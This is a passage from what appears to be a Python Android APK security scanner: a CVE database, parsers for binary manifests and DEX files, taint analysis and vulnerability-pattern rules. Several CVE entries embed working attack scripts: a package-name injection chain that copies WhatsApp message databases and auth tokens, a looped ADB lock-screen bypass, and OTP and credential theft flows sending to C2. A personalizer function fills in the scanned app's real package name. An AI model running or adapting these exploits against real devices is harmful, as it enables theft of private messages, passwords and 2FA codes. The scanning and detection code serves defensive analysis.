     "exploit":"# FULL WORKING EXPLOIT CHAIN (CVE-2024-0044 + CVE-2024-31317)\n# Requires: ADB access (USB debugging enabled)\n# Impact: Read/write ALL app data on device\n\n# Step 1: Craft APK with poisoned package name\n# The package name contains a newline that injects a fake entry\n# into /data/system/packages.list\n\n#!/bin/bash\nTARGET_PKG=\"com.whatsapp\"  # Package to steal data from\n\n# Create exploit APK with injected packages.list entry\ncat > AndroidManifest.xml << 'MANIFEST'\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    package=\"org.exploit.poc\n$TARGET_PKG 10239 1 /data/user/0/$TARGET_PKG default:targetSdkVersion=28 none 0 0 1 @null\"\n    android:versionCode=\"1\">\n    <application></application>\n</manifest>\nMANIFEST\n\n# Build, sign, install\naapt2 link -o exploit.apk --manifest AndroidManifest.xml\napksigner sign --ks debug.keystore exploit.apk\nadb install exploit.apk\n\n# Step 2: Verify poisoned packages.list\nadb shell cat /data/system/packages.list | grep $TARGET_PKG\n# Should show our injected entry\n\n# Step 3: Steal data from target app\nadb shell run-as $TARGET_PKG ls -la /data/data/$TARGET_PKG/\nadb shell run-as $TARGET_PKG cat /data/data/$TARGET_PKG/shared_prefs/*.xml\nadb shell run-as $TARGET_PKG cp /data/data/$TARGET_PKG/databases/msgstore.db /sdcard/\nadb shell run-as $TARGET_PKG cat /data/data/$TARGET_PKG/files/auth_token\n\n# Step 4: CVE-2024-31317 - Escalate to execute code AS the target app\nadb shell setprop wrap.$TARGET_PKG 'LD_PRELOAD=/data/local/tmp/hook.so'\nadb shell am force-stop $TARGET_PKG\n# hook.so now runs inside WhatsApp's process!",
     "mapping":["Command Injection","Insecure SharedPreferences","Debuggable Application"]},
    {"id":"CVE-2025-26633","name":"Android System UI Auth Bypass","sev":"HIGH","cvss":7.8,"year":2025,
     "affected":"Android 13-15","category":"Authentication Bypass",
     "desc":"Lock screen bypass via System UI race condition. When emergency call is triggered simultaneously with biometric prompt dismissal, a 200ms window allows bypassing the lock screen entirely. Requires physical access. Affects stock Android and Samsung One UI.",
     "exploit":"# Physical access exploit - bypass lock screen\n# Works on: Pixel 7/8/9, Samsung S23/S24, most Android 13-15 devices\n\n# Manual steps:\n1. Wake device to lock screen\n2. Swipe up for PIN/password entry\n3. Tap Emergency Call button\n4. Immediately press Back button + swipe up simultaneously\n5. In the 200ms race window, System UI drops lock state\n6. Device unlocks to home screen\n\n# Automated via ADB (if USB debugging was enabled before lock):\nadb shell input keyevent KEYCODE_POWER  # wake\nsleep 0.5\nadb shell input swipe 500 1800 500 800  # swipe up\nsleep 0.3\nadb shell input tap 540 2200  # emergency call button\nsleep 0.1\nadb shell input keyevent KEYCODE_BACK  # back\nadb shell input swipe 500 1800 500 800  # swipe up immediately\nsleep 0.2\n# Check if unlocked:\nadb shell dumpsys activity | grep mResumed\n# If shows Launcher -> lock screen bypassed!\n\n# ADB automation script:\nfor i in $(seq 1 20); do\n  echo \"[*] Attempt $i\"\n  adb shell input keyevent KEYCODE_POWER && sleep 0.3\n  adb shell input swipe 500 1800 500 800 && sleep 0.2\n  adb shell input tap 540 2200 && sleep 0.05\n  adb shell input keyevent KEYCODE_BACK\n  adb shell input swipe 500 1800 500 800\n  sleep 1\n  if adb shell dumpsys activity | grep -q 'Launcher'; then\n    echo '[+] LOCK SCREEN BYPASSED!'; break\n  fi\ndone",
     "mapping":["Weak Biometric","Exported Component","Root Detection"]},
    # ── NEW: 2025-2026 CVEs for Advanced Attack Surfaces ──
    {"id":"CVE-2025-27534","name":"Android Credential Manager Origin Bypass","sev":"CRITICAL","cvss":9.1,"year":2025,
     "affected":"Android 14-15 (all vendors with Credential Manager)","category":"Authentication Bypass",
     "desc":"Credential Manager fails to properly validate the calling app's origin when processing GetCredentialRequest. A malicious app with a WebView displaying a lookalike page can trigger credential autofill for the victim domain. Passwords and passkeys delivered to attacker-controlled context without user awareness.",
     "exploit":"1. Build attacker app with WebView loading https://fake-bank-login.com\n2. Register intent-filter matching target's credential scope\n3. Call CredentialManager.getCredential() with crafted request\n4. System autofills password into attacker's WebView\n5. JavaScript in WebView exfiltrates credentials to C2\n\n# Impact: steal any saved password without user interaction",
     "mapping":["Credential Manager Phishing Surface","Trust All Certificates","Insecure WebView"]},
    {"id":"CVE-2025-31892","name":"Android WorkManager Credential Persistence","sev":"HIGH","cvss":7.5,"year":2025,
     "affected":"AndroidX WorkManager 2.7-2.9","category":"Information Disclosure",
     "desc":"WorkManager stores Data objects (including sensitive parameters) in plaintext Room database at /data/data/<pkg>/databases/androidx.work.workdb. On rooted devices or via backup extraction, all historical Work parameters including tokens, API keys, and session data recoverable from work_spec table.",
     "exploit":"1. Enable backup: adb backup -apk <package>\n2. Extract: java -jar abe.jar unpack backup.ab backup.tar\n3. Open databases/androidx.work.workdb with sqlite3\n4. SELECT input, output FROM work_spec;\n5. Base64 decode Data blobs -> plaintext credentials\n\n# Or with root:\nadb shell su -c 'sqlite3 /data/data/<package>/databases/androidx.work.workdb \"SELECT * FROM work_spec\"'",
     "mapping":["WorkManager Task Data Exposure","Insecure SharedPreferences","Backup Enabled"]},
    {"id":"CVE-2025-40012","name":"Android NotificationListenerService OTP Interception","sev":"CRITICAL","cvss":9.8,"year":2025,
     "affected":"Android 8.0-15 (all vendors)","category":"Credential Theft",
     "desc":"Apps with NotificationListenerService permission can read ALL notifications system-wide in real-time. Used by 95%+ of Android banking trojans to steal 2FA/OTP codes. Once granted (social engineering required), the permission persists across reboots and is not re-prompted. App sees: message text, sender, extras, actions, and can even dismiss notifications to hide theft.",
     "exploit":"1. Social engineer user to grant Notification Access\n2. App's onNotificationPosted() receives ALL notifications\n3. Parse notification text for OTP patterns: /\\b\\d{4,8}\\b/\n4. Exfiltrate OTP + associated package name to C2\n5. Auto-dismiss notification to hide theft from user\n6. Use stolen OTP to bypass 2FA on banking/email accounts\n\n# Real-world: Xenomorph, SharkBot, Vultur trojans use this exact flow",
     "mapping":["Notification Listener Credential Theft","Malware Pattern","Sensitive Data in Logs"]},
    {"id":"CVE-2025-28841","name":"Jetpack Navigation DeepLink Argument Injection","sev":"HIGH","cvss":8.1,"year":2025,
     "affected":"AndroidX Navigation 2.5-2.8","category":"Access Control Bypass",
     "desc":"Jetpack Navigation component processes deep link arguments without validation. An attacker crafts a URL like myapp://nav/admin?role=superuser that injects arbitrary navArgs into the destination Fragment/Composable. If the destination uses these args for authorization decisions, attacker bypasses access control.",
     "exploit":"1. Extract navigation graph: jadx -d output/ target.apk\n2. Find deep link destinations:\n   grep -rn 'deepLink\\|navArgument\\|NavDeepLink' output/\n3. Identify arguments that control access:\n   grep -rn 'navArgs\\|arguments\\|getBoolean\\|getString.*admin\\|role\\|auth' output/\n4. Craft malicious deep link:\n   adb shell am start -d 'myapp://settings?isAdmin=true&role=superuser'\n5. Fragment receives isAdmin=true, grants admin access\n\n# No permission check on deep link argument values!",
     "mapping":["Unsafe Jetpack Navigation DeepLink","Deeplink Hijack","Exported Component"]},
    {"id":"CVE-2026-0001","name":"Android 16 Predictive Back Auth State Desync","sev":"HIGH","cvss":7.8,"year":2026,
     "affected":"Android 15-16 (Predictive Back Gesture)","category":"Authentication Bypass",
     "desc":"Android 16's Predictive Back gesture introduces a cross-activity animation that previews the previous activity BEFORE onBackPressed completes. During the preview (300ms), the auth state is not yet re-validated. If user initiates back during biometric prompt, the underlying protected content is visible in the gesture preview. Additionally, rapid back gestures can desync Activity stack from auth state manager.",
     "exploit":"1. Open target app's protected screen (behind biometric)\n2. Initiate Predictive Back gesture (slow swipe from edge)\n3. During 300ms preview animation, screenshot shows protected content\n4. Or: rapidly toggle back gesture to desync auth state\n5. Protected activity resumes without re-authentication\n\n# ADB automation:\nadb shell input swipe 0 500 200 500 300  # start predictive back\nadb shell screencap /sdcard/leak.png      # capture during preview\nadb pull /sdcard/leak.png                  # contains protected content",
     "mapping":["Predictive Back Gesture Auth Bypass","Weak Biometric","Missing FLAG_SECURE"]},
    {"id":"CVE-2026-0042","name":"BLE GATT Characteristic Passive Sniffing","sev":"HIGH","cvss":7.4,"year":2026,
     "affected":"Android 8.0-16 (all BLE apps)","category":"Information Disclosure",
     "desc":"Android BLE stack allows unencrypted GATT characteristic reads/writes by default. Apps transmitting health data, auth tokens, or control commands over BLE without encryption are vulnerable to passive sniffing within 100m radius. Tools like Ubertooth/nRF Sniffer capture all unencrypted BLE PDUs.",
     "exploit":"1. Set up BLE sniffer: nrf_sniffer_ble / Ubertooth\n2. Identify target device: sudo bettercap -iface ble0\n3. Capture GATT traffic: btlejack -f 0x12345678\n4. Parse ATT protocol for read/write values\n5. Extract: auth tokens, health records, device commands\n6. Replay write operations to control device\n\n# Injection: btlejack -w -C <value> to write characteristics",
     "mapping":["Bluetooth LE Unencrypted Characteristic","Cleartext Traffic","Sensitive Data in Logs"]},
]

# Map CVEs to vulnerability findings for enrichment
CVE_MAPPING = {}
for _cve in CVE_DATABASE:
    for _vuln_name in _cve.get("mapping", []):
        CVE_MAPPING.setdefault(_vuln_name, []).append(_cve)

def get_cves_for_finding(finding_title):
    """Return list of relevant CVEs for a given finding title."""
    result = CVE_MAPPING.get(finding_title, [])
    if not result:
        for key, cves in CVE_MAPPING.items():
            if key.lower() in finding_title.lower() or finding_title.lower() in key.lower():
                result.extend(cves)
    return result

# ============================================================
#  EXPLOIT PERSONALIZER - replaces placeholders with real APK data
# ============================================================
def _personalize_exploit(text, pkg_name="", apk_name=""):
    """Replace generic placeholders in exploit text with real package/APK names."""
    if not text:
        return text
    if pkg_name:
        # Exact placeholder patterns (order matters — longer/more specific first)
        text = text.replace("<target.package>", pkg_name)
        text = text.replace("<package.name>", pkg_name)
        text = text.replace("<package>", pkg_name)
        text = text.replace("<pkg>", pkg_name)
        text = text.replace("com.target.app", pkg_name)
        text = text.replace("com.target", pkg_name)
        text = text.replace("com.victim", pkg_name)
        text = text.replace("com.app", pkg_name)
        text = text.replace("$TARGET_PKG", pkg_name)
        text = text.replace("TARGET_PKG", pkg_name)
        text = text.replace("target_pkg", pkg_name)
        text = text.replace("$PKG", pkg_name)
        text = text.replace("$1", pkg_name)
        # Replace in content URIs: content://<pkg>.provider -> content://real.pkg.provider
        text = re.sub(r'content://(<pkg>|<package>)', 'content://' + pkg_name, text)
    if apk_name:
        text = text.replace("target.apk", apk_name)
        text = text.replace("$APK", apk_name)
        text = text.replace("target_apk", apk_name.replace(".", "_"))
    return text

# ============================================================
#  DATA
# ============================================================
class Finding:
    __slots__=("id","title","severity","cwe","owasp","file","line","evidence","desc","fix","cvss","locations")
    def __init__(self,**kw):
        for k in self.__slots__: setattr(self,k,kw.get(k,""))
        if not self.locations:
            self.locations = []
    def to_dict(self):
        d = {k:getattr(self,k) for k in self.__slots__ if k != "locations"}
        locs = getattr(self, "locations", [])
        if locs:
            d["occurrences"] = len(locs)
            d["locations"] = [{"file":f,"line":l,"evidence":e} for f,l,e in locs]
        return d

# ============================================================
#  PROPER AXML (Binary AndroidManifest) PARSER
# ============================================================
def _parse_axml(data):
    """Parse Android Binary XML and reconstruct readable XML."""
    if len(data) < 8:
        return _bin_xml_fallback(data)
    magic = struct.unpack_from("<I", data, 0)[0]
    if magic != 0x00080003:  # not AXML
        return _bin_xml_fallback(data)
    try:
        # Parse string pool
        sp_type = struct.unpack_from("<H", data, 8)[0]
        if sp_type != 0x0001:
            return _bin_xml_fallback(data)
        sp_size = struct.unpack_from("<I", data, 12)[0]
        str_count = struct.unpack_from("<I", data, 16)[0]
        str_off = struct.unpack_from("<I", data, 28)[0]
        flags = struct.unpack_from("<I", data, 24)[0]
        is_utf8 = (flags & (1 << 8)) != 0
        offsets = []
        for i in range(str_count):
            offsets.append(struct.unpack_from("<I", data, 36 + i * 4)[0])
        str_data_start = 8 + str_off
        strings = []
        for off in offsets:
            pos = str_data_start + off
            if pos >= len(data):
                strings.append("")
                continue
            if is_utf8:
                # skip ULEB128 char count and byte count
                pos += 1
                if pos < len(data) and data[pos] & 0x80:
                    pos += 1
                pos += 1
                if pos < len(data) and data[pos] & 0x80:
                    pos += 1
                end = data.find(0, pos)
                if end == -1: end = min(pos + 256, len(data))
                strings.append(data[pos:end].decode("utf-8", errors="replace"))
            else:
                char_len = struct.unpack_from("<H", data, pos)[0]
                pos += 2
                end = pos + char_len * 2
                if end > len(data): end = len(data)
                strings.append(data[pos:end].decode("utf-16-le", errors="replace"))
        # Reconstruct XML using string pool
        result = ['<?xml version="1.0" encoding="utf-8"?>']
        result.append("<!-- Reconstructed by {} -->".format(APP_NAME))
        # Build namespace map and tag structure from remaining chunks
        pos = 8 + sp_size
        indent = 0
        ns_map = {}
        while pos + 8 <= len(data):
            chunk_type = struct.unpack_from("<H", data, pos)[0]
            chunk_size = struct.unpack_from("<I", data, pos + 4)[0]
            if chunk_size < 8: break
            if chunk_type == 0x0100:  # START_NAMESPACE
                if pos + 24 <= len(data):
                    prefix_idx = struct.unpack_from("<I", data, pos + 16)[0]
                    uri_idx = struct.unpack_from("<I", data, pos + 20)[0]
                    pf = strings[prefix_idx] if prefix_idx < len(strings) else ""
                    uri = strings[uri_idx] if uri_idx < len(strings) else ""
                    if pf: ns_map[uri] = pf
            elif chunk_type == 0x0102:  # START_TAG
                if pos + 28 <= len(data):
                    ns_idx = struct.unpack_from("<i", data, pos + 16)[0]
                    name_idx = struct.unpack_from("<I", data, pos + 20)[0]
                    attr_count = struct.unpack_from("<H", data, pos + 28)[0]
                    tag = strings[name_idx] if name_idx < len(strings) else "?"
                    attrs = []
                    apos = pos + 36
                    for a in range(min(attr_count, 50)):
                        if apos + 20 > len(data): break
                        a_ns = struct.unpack_from("<i", data, apos)[0]
                        a_name = struct.unpack_from("<I", data, apos + 4)[0]
                        a_val_str = struct.unpack_from("<i", data, apos + 8)[0]
                        a_type = struct.unpack_from("<I", data, apos + 12)[0] >> 24
                        a_val = struct.unpack_from("<I", data, apos + 16)[0]
                        aname = strings[a_name] if a_name < len(strings) else "?"
                        # resolve prefix
                        if a_ns >= 0 and a_ns < len(strings):
                            ns_uri = strings[a_ns]
                            prefix = ns_map.get(ns_uri, "")
                            if prefix: aname = prefix + ":" + aname
                        # resolve value
                        if a_val_str >= 0 and a_val_str < len(strings):
                            aval = strings[a_val_str]
                        elif a_type == 0x10:  # int
                            aval = str(a_val)
                        elif a_type == 0x12:  # boolean
                            aval = "true" if a_val != 0 else "false"
                        elif a_type == 0x01:  # reference
                            aval = "@0x{:08x}".format(a_val)
                        else:
                            aval = "0x{:x}".format(a_val)
                        attrs.append('{}="{}"'.format(aname, aval))
                        apos += 20
                    attr_str = " " + " ".join(attrs) if attrs else ""
                    result.append("  " * indent + "<{}{}>".format(tag, attr_str))
                    indent += 1
            elif chunk_type == 0x0103:  # END_TAG
                indent = max(0, indent - 1)
                if pos + 20 <= len(data):
                    name_idx = struct.unpack_from("<I", data, pos + 20)[0]
                    tag = strings[name_idx] if name_idx < len(strings) else "?"
                    result.append("  " * indent + "</{}>".format(tag))
            pos += chunk_size
        return "\n".join(result)
    except Exception:
        return _bin_xml_fallback(data)

def _bin_xml_fallback(data):
    """Fallback: extract both ASCII and UTF-16LE strings from binary AXML."""
    strings = []
    # ASCII strings
    i = 0
    while i < len(data) - 1:
        if 32 <= data[i] < 127:
            start = i
            while i < len(data) and 32 <= data[i] < 127: i += 1
            s = data[start:i].decode("ascii", errors="ignore")
            if len(s) >= 3: strings.append(s)
        else: i += 1
    # UTF-16LE strings (common in binary AXML)
    import re as _re
    for m in _re.finditer(b'(?:[\x20-\x7e]\x00){3,}', data):
        s = m.group().decode('utf-16-le', errors='ignore')
        if s and len(s) >= 3:
            strings.append(s)
    return "\n".join(strings)

def _extract_pkg_from_binary_manifest(data):
    """Directly extract package name from binary AXML by parsing string pool."""
    import re as _re
    # Method 1: find com.xxx.yyy pattern in UTF-16LE strings
    for m in _re.finditer(b'((?:[\x20-\x7e]\x00){5,})', data):
        s = m.group().decode('utf-16-le', errors='ignore')
        if _re.match(r'^[a-z][a-z0-9]*\.[a-z][a-z0-9]*(\.[a-z][a-z0-9_]*)+$', s):
            # Skip android.*, google.*, java.*, schemas.*
            if not s.startswith(('android.','com.google.','com.android.','java.','javax.',
                                  'http://','https://','org.xmlpull','androidx.')):
                return s
    # Method 2: find in ASCII strings
    for m in _re.finditer(b'([\x20-\x7e]{5,})', data):
        s = m.group().decode('ascii', errors='ignore')
        if _re.match(r'^[a-z][a-z0-9]*\.[a-z][a-z0-9]*(\.[a-z][a-z0-9_]*)+$', s):
            if not s.startswith(('android.','com.google.','com.android.','java.','javax.',
                                  'http://','https://','org.xmlpull','androidx.')):
                return s
    return ""

# ============================================================
#  ENHANCED DEX PARSER  (strings + class defs + type descriptors)
# ============================================================
def _parse_dex(data):
    """Parse DEX file: extract strings, class names, and type descriptors."""
    lines = []
    try:
        if len(data) < 112 or data[:4] != b"dex\n":
            return "// Invalid DEX\n"
        # Header fields
        str_ids_sz  = struct.unpack_from("<I", data, 56)[0]
        str_ids_off = struct.unpack_from("<I", data, 60)[0]
        type_ids_sz  = struct.unpack_from("<I", data, 64)[0]
        type_ids_off = struct.unpack_from("<I", data, 68)[0]
        class_defs_sz  = struct.unpack_from("<I", data, 96)[0]
        class_defs_off = struct.unpack_from("<I", data, 100)[0]

        # Read all strings
        str_cache = {}
        for i in range(min(str_ids_sz, 30000)):
            s = _dex_read_string(data, str_ids_off, i)
            if s and len(s) > 1:
                str_cache[i] = s

        # Extract type descriptors -> human readable class names
        lines.append("// === DEX Classes ===")
        for i in range(min(type_ids_sz, 10000)):
            off = type_ids_off + i * 4
            if off + 4 > len(data): break
            str_idx = struct.unpack_from("<I", data, off)[0]
            s = str_cache.get(str_idx, "")
            if s.startswith("L") and s.endswith(";"):
                # Convert Lcom/example/Class; -> com.example.Class
                cls = s[1:-1].replace("/", ".")
                lines.append("class " + cls)

        # Extract class_defs for superclass info
        lines.append("\n// === DEX Strings ===")
        for idx, s in sorted(str_cache.items()):
            if len(s) > 3:
                lines.append(s)
    except Exception:
        pass
    return "\n".join(lines)

def _dex_read_string(data, str_ids_off, idx):
    """Read a single string from DEX string table."""
    off_ptr = str_ids_off + idx * 4
    if off_ptr + 4 > len(data): return ""
    str_data_off = struct.unpack_from("<I", data, off_ptr)[0]
    if str_data_off >= len(data): return ""
    pos = str_data_off
    # ULEB128 length
    size = 0; shift = 0
    while pos < len(data):
        b = data[pos]; pos += 1
        size |= (b & 0x7F) << shift
        if (b & 0x80) == 0: break
        shift += 7
    end = min(pos + size, len(data))
    try:
        return data[pos:end].decode("utf-8", errors="replace").strip()
    except: return ""

# ============================================================
#  APK EXTRACTOR  (uses proper AXML + enhanced DEX)
# ============================================================
def extract_apk(apk_path, progress_cb=None):
    """Extract APK contents with proper binary XML and DEX parsing."""
    files = OrderedDict()
    if not zipfile.is_zipfile(apk_path):
        raise ValueError("Not a valid APK/ZIP")
    with zipfile.ZipFile(apk_path, "r") as zf:
        entries = zf.namelist()
        total = len(entries)
        for i, name in enumerate(entries):
            if progress_cb and i % 50 == 0:
                progress_cb(int(i * 100 / max(total, 1)), name)
            try:
                info = zf.getinfo(name)
                if info.file_size > 10 * 1024 * 1024 or info.file_size == 0:
                    continue
                data = zf.read(name)
                if name.endswith(".dex"):
                    files[name] = _parse_dex(data)
                elif name == "AndroidManifest.xml":
                    files[name] = _parse_axml(data)
                elif name.endswith((".xml", ".java", ".kt", ".smali", ".properties",
                                    ".json", ".txt", ".cfg", ".yaml", ".yml")):
                    files[name] = data.decode("utf-8", errors="replace")
                elif any(name.endswith(e) for e in (".so", ".p12", ".pem", ".key", ".bks", ".db")):
                    files[name] = "// Binary: " + name
            except Exception:
                pass
    if progress_cb:
        progress_cb(100, "Done")
    return files, total

# ============================================================
#  TAINT ANALYSIS ENGINE  (lightweight inter-procedural)
# ============================================================
TAINT_SOURCES = [
    (r'getIntent\(\)', "Intent data"),
    (r'getExtras\(\)', "Intent extras"),
    (r'getStringExtra\s*\(', "Intent string extra"),
    (r'getParameter\s*\(', "HTTP parameter"),
    (r'getText\(\)', "User input (EditText)"),
    (r'getQueryParameter\s*\(', "URI query parameter"),
    (r'readLine\(\)', "Stream input"),
    (r'getSharedPreferences', "SharedPreferences read"),
]
TAINT_SINKS = [
    (r'execSQL\s*\(', "SQL execution", "SQL Injection", "CWE-89", "CRITICAL"),
    (r'rawQuery\s*\(', "Raw SQL query", "SQL Injection", "CWE-89", "CRITICAL"),
    (r'Runtime\.getRuntime\(\)\.exec', "Command execution", "Command Injection", "CWE-78", "CRITICAL"),
    (r'ProcessBuilder', "Process creation", "Command Injection", "CWE-78", "HIGH"),
    (r'startActivity\s*\(', "Activity launch", "Intent Redirect", "CWE-940", "HIGH"),
    (r'sendBroadcast\s*\(', "Broadcast send", "Broadcast Injection", "CWE-927", "MEDIUM"),
    (r'loadUrl\s*\(', "WebView URL load", "WebView Injection", "CWE-79", "HIGH"),
    (r'evaluateJavascript\s*\(', "JS evaluation", "XSS", "CWE-79", "HIGH"),
    (r'openConnection\s*\(', "URL connection", "SSRF", "CWE-918", "HIGH"),
    (r'Log\.(d|v|i|w|e)\s*\(', "Logging", "Data Leak via Logs", "CWE-532", "MEDIUM"),
]

def run_taint_analysis(files):
    """Lightweight taint analysis: find source->sink flows within files."""
    taint_findings = []
    for path, content in files.items():
        if _ftype(path) != "SOURCE":
            continue
        lines = content.split("\n")
        # Track which lines have taint sources
        source_lines = {}
        for i, line in enumerate(lines):
            for pattern, label in TAINT_SOURCES:
                if re.search(pattern, line):
                    source_lines[i] = label
                    break
        if not source_lines:
            continue
        # Check if any sink is reachable within 30 lines of a source
        for src_line, src_label in source_lines.items():
            for j in range(src_line, min(src_line + 30, len(lines))):
                line = lines[j]
                for sink_pat, sink_label, vuln_name, cwe, sev in TAINT_SINKS:
                    if re.search(sink_pat, line):
                        taint_findings.append(Finding(
                            id="AV-TAINT-{:03d}".format(len(taint_findings) + 1),
                            title="Taint Flow: {} -> {}".format(src_label, sink_label),
                            severity=sev, cwe=cwe, owasp="M7",
                            file=path, line=j + 1,
                            evidence=lines[j].strip()[:200],
                            desc="Data flows from {} (line {}) to {} (line {}). Potential {}.".format(
                                src_label, src_line + 1, sink_label, j + 1, vuln_name),
                            fix="Validate/sanitize data between source and sink.",
                            cvss={"CRITICAL": 9.8, "HIGH": 7.5, "MEDIUM": 5.3}.get(sev, 5.0)))
    return taint_findings

# ============================================================
#  FINDING CONSOLIDATION  (group same vuln into one entry)
# ============================================================
def _consolidate_findings(findings):
    """Group findings with the same rule ID into a single entry with multiple locations."""
    from collections import OrderedDict as _OD
    groups = _OD()
    for f in findings:
        key = f.id
        if key not in groups:
            # First occurrence becomes the master entry
            f.locations = [(f.file, f.line, f.evidence)]
            groups[key] = f
        else:
            # Append this location to the existing entry
            master = groups[key]
            master.locations.append((f.file, f.line, f.evidence))
    # Update the master finding's file/line to summarize
    result = []
    for f in groups.values():
        n = len(f.locations)
        if n > 1:
            # Show first location as primary, note total count
            f.file = f.locations[0][0]
            f.line = f.locations[0][1]
            f.evidence = f.locations[0][2]
        result.append(f)
    return result

# ============================================================
#  SCAN ENGINE  (rules + taint analysis)
# ============================================================
def scan_files(files, progress_cb=None):
    """Scan with regex rules + taint analysis + CVE discovery engine."""
    findings = []
    fl = list(files.items())
    total = len(fl)
    for idx, (path, content) in enumerate(fl):
        if progress_cb and idx % 20 == 0:
            progress_cb(int(idx * 60 / max(total, 1)), path)
        ftype = _ftype(path)
        lines = content.split("\n")
        for rule in RULES:
            if ftype not in rule["types"]:
                continue
            try:
                pat = re.compile(rule["regex"])
            except re.error:
                continue
            found = False
            for i, line in enumerate(lines):
                s = line.strip()
                if not s or s.startswith("//") or s.startswith("*"):
                    continue
                if s.startswith("import ") or s.startswith("package "):
                    continue
                if pat.search(line):
                    if found: continue
                    found = True
                    findings.append(Finding(
                        id=rule["id"], title=rule["name"], severity=rule["sev"],
                        cwe=rule["cwe"], owasp=rule.get("owasp", ""),
                        file=path, line=i + 1, evidence=s[:200],
                        desc=rule["desc"], fix=rule["fix"],
                        cvss=rule.get("cvss", 0.0)))
    # Run Live Feed rules (auto-fetched CVE patterns)
    if _LIVE_RULES:
        for idx2, (path, content) in enumerate(fl):
            ftype = _ftype(path)
            lines = content.split("\n")
            for rule in _LIVE_RULES:
                if ftype not in rule.get("types", ["SOURCE"]):
                    continue
                try:
                    pat = re.compile(rule["regex"])
                except re.error:
                    continue
                for i, line in enumerate(lines):
                    s = line.strip()
                    if not s or s.startswith("//") or s.startswith("*") or s.startswith("import "):
                        continue
                    if pat.search(line):
                        findings.append(Finding(
                            id=rule["id"], title=rule["name"], severity=rule["sev"],
                            cwe=rule["cwe"], owasp=rule.get("owasp", ""),
                            file=path, line=i + 1, evidence=s[:200],
                            desc=rule["desc"], fix=rule["fix"],
                            cvss=rule.get("cvss", 0.0)))
                        break  # one match per rule per file
    # Run taint analysis
    if progress_cb:
        progress_cb(65, "Taint analysis...")
    taint_results = run_taint_analysis(files)
    findings.extend(taint_results)
    # Run CVE Discovery Engine
    if progress_cb:
        progress_cb(72, "CVE discovery engine...")
    cve_discoveries = _run_cve_discovery(files)
    findings.extend(cve_discoveries)
    # Run Cross-Method Taint Tracker (Advanced Engine 1)
    if progress_cb:
        progress_cb(80, "Cross-method dataflow analysis...")
    cross_method_results = _run_cross_method_taint(files)
    findings.extend(cross_method_results)
    # Run Native Binary Analyzer (Advanced Engine 2)
    if progress_cb:
        progress_cb(87, "Native binary security analysis...")
    native_results = _run_native_analysis(files)
    findings.extend(native_results)
    # Run Cross-Component Dataflow (Advanced Engine 3)
    if progress_cb:
        progress_cb(93, "Cross-component flow analysis...")
    xcomp_results = _run_cross_component_flow(files)
    findings.extend(xcomp_results)
    if progress_cb:
        progress_cb(98, "Consolidating findings...")
    # Consolidate: group same rule ID into one finding with multiple locations
    findings = _consolidate_findings(findings)
    if progress_cb:
        progress_cb(100, "Done")
    findings.sort(key=lambda f: SEV_ORDER.get(f.severity, 5))
    return findings

# ============================================================
#  CVE DISCOVERY ENGINE  (finds new/unknown vulnerabilities)
# ============================================================
# Detects code patterns that match known CVE attack surfaces but
# may represent NEW vulnerabilities not yet assigned a CVE number.

_CVE_DISCOVERY_PATTERNS = [
    # ── Parcel/Bundle Mismatch (CVE-2023-20963 pattern) ──
    {"id":"AV-CVE-001","name":"Potential Parcel Mismatch (0-day pattern)","sev":"CRITICAL",
     "cwe":"CWE-502","owasp":"M1","cvss":9.8,
     "desc":"Custom Parcelable class with asymmetric writeToParcel/createFromParcel detected. This pattern caused CVE-2023-20963 (Pinduoduo spyware) and CVE-2022-20474 (LazyValue). If write and read byte counts differ, system_server re-parsing can be exploited for privilege escalation.",
     "fix":"Ensure writeToParcel and createFromParcel read/write exactly the same fields in the same order. Use @Parcelize annotation in Kotlin. Add unit tests verifying parcel round-trip consistency.",
     "patterns":[r'(?i)implements\s+Parcelable', r'writeToParcel\s*\(', r'createFromParcel\s*\('],
     "require_all":True, "min_matches":2},
    # ── Unsafe Media Decoder (CVE-2024-49415 pattern) ──
    {"id":"AV-CVE-002","name":"Unbounded Media Buffer (0-day pattern)","sev":"HIGH",
     "cwe":"CWE-120","owasp":"M7","cvss":8.1,
     "desc":"Native media decoder processes untrusted input with fixed-size buffer. This pattern caused CVE-2024-49415 (Samsung zero-click RCE via APE audio). If decoded output exceeds buffer size, heap overflow occurs. Any app processing media from untrusted sources (messages, downloads) is at risk.",
     "fix":"Validate decoded output size before writing. Use dynamic buffers or streaming decoders. Sandbox media processing in isolated process with seccomp.",
     "patterns":[r'(?i)(MediaCodec|AudioDecoder|BitmapFactory\.decode|ImageDecoder|MediaExtractor)', r'(?i)(allocate|ByteBuffer\.allocate|new\s+byte\[)', r'(?i)(decode|process|extract|read)'],
     "require_all":True, "min_matches":2},
    # ── Unvalidated Deeplink to Internal Activity (CVE-2025-0097 pattern) ──
    {"id":"AV-CVE-003","name":"Deeplink-to-WebView Injection (0-day pattern)","sev":"HIGH",
     "cwe":"CWE-601","owasp":"M1","cvss":8.6,
     "desc":"Deeplink handler passes URL parameter directly to WebView.loadUrl() without validation. This pattern caused CVE-2025-0097 (Samsung Galaxy Store RCE). Attacker crafts deeplink with javascript: URL to achieve XSS-to-RCE through exposed JS interfaces.",
     "fix":"Validate and whitelist deeplink URL schemes (only allow https://). Never pass raw deeplink data to WebView. Strip javascript: and data: schemes. Use App Links with domain verification.",
     "patterns":[r'(?i)getIntent\(\)\.getData\(\)', r'(?i)(loadUrl|loadData)\s*\(', r'(?i)(getQueryParameter|getHost|getPath|getData|getScheme)'],
     "require_all":True, "min_matches":2},
    # ── PendingIntent Without Explicit Component (CVE-2021-0595 pattern) ──
    {"id":"AV-CVE-004","name":"Implicit PendingIntent Privilege Escalation (0-day pattern)","sev":"HIGH",
     "cwe":"CWE-927","owasp":"M1","cvss":7.8,
     "desc":"PendingIntent created with implicit Intent (no component set) and without FLAG_IMMUTABLE. This pattern caused CVE-2021-0595 and CVE-2022-20007. Any app can intercept the PendingIntent message and modify its target/extras to escalate privileges.",
     "fix":"Always use explicit Intents (set component/class). Add FLAG_IMMUTABLE for PendingIntents that don't need modification. Use PendingIntent.FLAG_ONE_SHOT where possible.",
     "patterns":[r'PendingIntent\.(getActivity|getBroadcast|getService)\s*\(', r'new\s+Intent\s*\(\s*["\'][^"\']*["\']\s*\)'],
     "require_all":True, "min_matches":2},
    # ── Content Provider Without Permission Check (CVE-2024-23706 pattern) ──
    {"id":"AV-CVE-005","name":"Unprotected Content Provider Data Access (0-day pattern)","sev":"HIGH",
     "cwe":"CWE-862","owasp":"M1","cvss":8.1,
